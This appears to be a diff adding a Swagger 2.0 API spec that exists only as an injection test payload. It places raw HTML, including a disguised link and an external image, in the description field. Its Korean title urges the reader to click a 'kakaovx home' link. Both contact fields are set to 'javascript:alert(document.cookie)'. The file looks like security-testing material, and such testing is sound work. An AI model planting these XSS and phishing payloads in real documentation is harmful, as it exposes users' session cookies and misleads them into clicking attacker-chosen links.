@@ -1,0 +1,11 @@
+{
+  "swagger": "2.0",
+  "info": 
+  {"title": "아래 [kakaovx 홈으로 이동] 링크를 클릭하세요",
+  "description": "</p><a href='https://www.ahnlab.com'><h2>kakaovx 홈으로 이동</h2></a><p><img src='https://pbs.twimg.com/media/Et2zb0zVcAAgzEN.jpg'>"},
+  "contact": 
+  {"name": "AHNLAB",
+    "url": "javascript:alert(document.cookie)",
+    "email": "javascript:alert(document.cookie)"},
+  "version": "1.0.1"
+}
